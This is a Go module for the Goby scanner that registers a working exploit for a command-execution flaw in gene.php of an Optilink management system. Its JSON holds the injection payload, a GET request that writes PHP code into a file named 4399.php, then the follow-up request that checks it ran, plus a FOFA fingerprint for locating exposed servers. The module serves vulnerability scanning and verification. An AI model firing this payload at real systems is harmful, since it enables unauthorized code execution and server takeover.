package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Optilink Management system gene.php RCE",
    "Description": "<p>An arbitrary command execution vulnerability in the gene.php file of a background management system product of Optilink, which can execute arbitrary commands or upload malicious PHP Trojans to control the server.</p><p>Attackers can upload malicious php Trojans to control the server.</p>",
    "Impact": "Optilink Management system gene.php RCE",
    "Recommendation": "<p>1. Strictly verify the interface and restrict file writing</p><p>2. Set up a whitelist</p>",
    "Product": "Optilink",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Optilink 管理系统 gene.php 任意命令执行漏洞",
            "Description": "<p><span style=\"color: rgb(114, 114, 114); font-size: 16px;\">Optilink 某后台管理系统产品 gene.php 文件任意命令执行漏洞，可执行任意命令或者上传恶意的php木马控制服务器。</span><br></p><p><span style=\"color: rgb(114, 114, 114); font-size: 16px;\"><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">攻击者</span><span style=\"font-size: 16px; color: rgb(114, 114, 114);\">可上传恶意的php木马控制服务器。</span><br></span></p>",
            "Impact": "<p>攻击者<span style=\"color: rgb(114, 114, 114); font-size: 16px;\">可上传恶意的php木马控制服务器。</span></p>",
            "Recommendation": "<p>1、对接口做严格校验，限制文件写入</p><p><span style=\"color: var(--primaryFont-color);\">2、设置白名单</span></p>",
            "Product": "Optilink 某后台管理系统",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Optilink Management system gene.php RCE",
            "Description": "<p>An arbitrary command execution vulnerability in the gene.php file of a background management system product of Optilink, which can execute arbitrary commands or upload malicious PHP Trojans to control the server.<br></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Attackers can upload malicious php Trojans to control the server.</span><br></p>",
            "Impact": "Optilink Management system gene.php RCE",
            "Recommendation": "<p>1. Strictly verify the interface and restrict file writing</p><p><span style=\"color: var(--primaryFont-color);\">2. Set up a whitelist</span></p>",
            "Product": "Optilink",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"/html/css/dxtdata.css\"",
    "GobyQuery": "body=\"/html/css/dxtdata.css\"",
    "Author": "abszse",
    "Homepage": "https://optilinknetwork.com/",
    "DisclosureDate": "2022-03-23",
    "References": [
        "http://fofa.so"
    ],
    "HasExp": true,
    "Is0day": true,
    "Level": "2",
    "CVSS": "10",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2022-25717"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi/fsystem/gene.php?olt_op=1&olt_name=\"<?php%20echo%20md5(1231);unlink(__FILE__);?>\">4399.php;",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi/fsystem/4399.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "6c14da109e294d1e8155be8aa4b1ce8e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi/fsystem/gene.php?olt_op=1&olt_name=\"<?php%20echo%20md5(1231);unlink(__FILE__);?>\">4399.php;",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi/fsystem/4399.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "6c14da109e294d1e8155be8aa4b1ce8e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "ifconfig",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10264"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
